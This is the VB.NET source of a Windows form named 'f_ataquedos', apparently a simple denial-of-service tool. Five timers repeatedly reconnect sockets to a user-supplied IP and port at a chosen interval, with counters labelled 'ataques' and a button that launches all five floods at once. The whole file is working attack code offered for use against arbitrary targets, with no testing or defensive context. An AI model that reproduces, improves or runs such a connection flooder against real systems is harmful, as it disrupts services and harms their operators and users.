Public Class f_ataquedos
    Private Declare Function ReleaseCapture Lib "user32" () As Long
    Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
            (ByVal hwnd As Long, _
             ByVal wMsg As Long, _
             ByVal wParam As Integer, _
             ByVal lParam As String) As Long

    Private Sub T1_Timer(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles T1.Tick
        On Error Resume Next
        W1.Close()
        W1.Connect(txt_IP.Text, txt_Port.Text)
        txt_ataques1.Text = txt_ataques1.Text + 1
        txt_total.Text = txt_total.Text + 1
    End Sub
    Private Sub T2_Timer(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles T2.Tick
        On Error Resume Next
        W2.Close()
        W2.Connect(txt_IP.Text, txt_Port.Text)
        txt_ataques2.Text = txt_ataques2.Text + 1
        txt_total.Text = txt_total.Text + 1
    End Sub
    Private Sub T3_Timer(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles T3.Tick
        On Error Resume Next
        W3.Close()
        W3.Connect(txt_IP.Text, txt_Port.Text)
        txt_ataques3.Text = txt_ataques3.Text + 1
        txt_total.Text = txt_total.Text + 1
    End Sub
    Private Sub T4_Timer(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles T4.Tick
        On Error Resume Next
        W4.Close()
        W4.Connect(txt_IP.Text, txt_Port.Text)
        txt_ataques4.Text = txt_ataques4.Text + 1
        txt_total.Text = txt_total.Text + 1
    End Sub
    Private Sub T5_Timer(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles T5.Tick
        On Error Resume Next
        W5.Close()
        W5.Connect(txt_IP.Text, txt_Port.Text)
        txt_ataques5.Text = txt_ataques5.Text + 1
        txt_total.Text = txt_total.Text + 1
    End Sub
    Private Sub L1_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles intervalo.ValueChanged


        T1.Interval = CInt(intervalo.Value)
        T2.Interval = CInt(intervalo.Value)
        T3.Interval = CInt(intervalo.Value)
        T4.Interval = CInt(intervalo.Value)
        T5.Interval = CInt(intervalo.Value)



    End Sub
    Private Sub btn1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn1.Click
        On Error Resume Next
        If txt_ataques1.Enabled = False Then
            T1.Interval = CInt(intervalo.Value)
            T1.Start()
            Timer.Start()
            txt_ataques1.Enabled = True
        Else
            txt_ataques1.Enabled = False
            T1.Stop()
            Timer.Stop()
        End If
    End Sub
    Private Sub bnt2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn2.Click
        On Error Resume Next
        If txt_ataques2.Enabled = False Then
            T2.Interval = CInt(intervalo.Value)
            T2.Start()
            Timer.Start()
            txt_ataques2.Enabled = True
        Else
            txt_ataques2.Enabled = False
            T2.Stop()
            Timer.Stop()
        End If
    End Sub
    Private Sub btn3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn3.Click
        On Error Resume Next
        If txt_ataques3.Enabled = False Then
            T3.Interval = CInt(intervalo.Value)
            T3.Start()
            Timer.Start()
            txt_ataques3.Enabled = True
        Else
            txt_ataques3.Enabled = False
            T3.Stop()
            Timer.Stop()
        End If
    End Sub
    Private Sub btn4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn4.Click
        On Error Resume Next
        If txt_ataques4.Enabled = False Then
            T4.Interval = CInt(intervalo.Value)
            T4.Start()
            Timer.Start()
            txt_ataques4.Enabled = True
        Else
            txt_ataques4.Enabled = False
            T4.Stop()
            Timer.Stop()
        End If
    End Sub
    Private Sub btn5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn5.Click
        On Error Resume Next
        If txt_ataques5.Enabled = False Then
            T5.Interval = CInt(intervalo.Value)
            T5.Start()
            Timer.Start()
            txt_ataques5.Enabled = True
        Else
            txt_ataques5.Enabled = False
            T5.Stop()
            Timer.Stop()
        End If
    End Sub
    Private Sub f_ataquedos_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Dim oClass As Class1
        oClass = New Class1()
        oClass.Comenzar(Me, 0.95, 3)
    End Sub
    Private Sub btn_todos_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn_todos.Click
        On Error Resume Next
        todo()
    End Sub
    Function todo() As String
        If lbl_inf.Text = "" Then
            lbl_inf.Text = " "
            Timer.Start()
            T1.Interval = CInt(intervalo.Value)
            T1.Start()
            txt_ataques1.Enabled = True

            T2.Interval = CInt(intervalo.Value)
            T2.Start()
            txt_ataques2.Enabled = True

            T3.Interval = CInt(intervalo.Value)
            T3.Start()
            txt_ataques3.Enabled = True

            T4.Interval = CInt(intervalo.Value)
            T4.Start()
            txt_ataques4.Enabled = True

            T5.Interval = CInt(intervalo.Value)
            T5.Start()
            txt_ataques5.Enabled = True
        Else
            lbl_inf.Text = ""
            Timer.Stop()
            txt_ataques1.Enabled = False
            T1.Stop()
            txt_ataques2.Enabled = False
            T2.Stop()
            txt_ataques3.Enabled = False
            T3.Stop()
            txt_ataques4.Enabled = False
            T4.Stop()
            txt_ataques5.Enabled = False
            T5.Stop()

        End If

    End Function
    Private Sub Timer_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer.Tick
        Tiempo.Text = Tiempo.Text + 1
    End Sub
End Class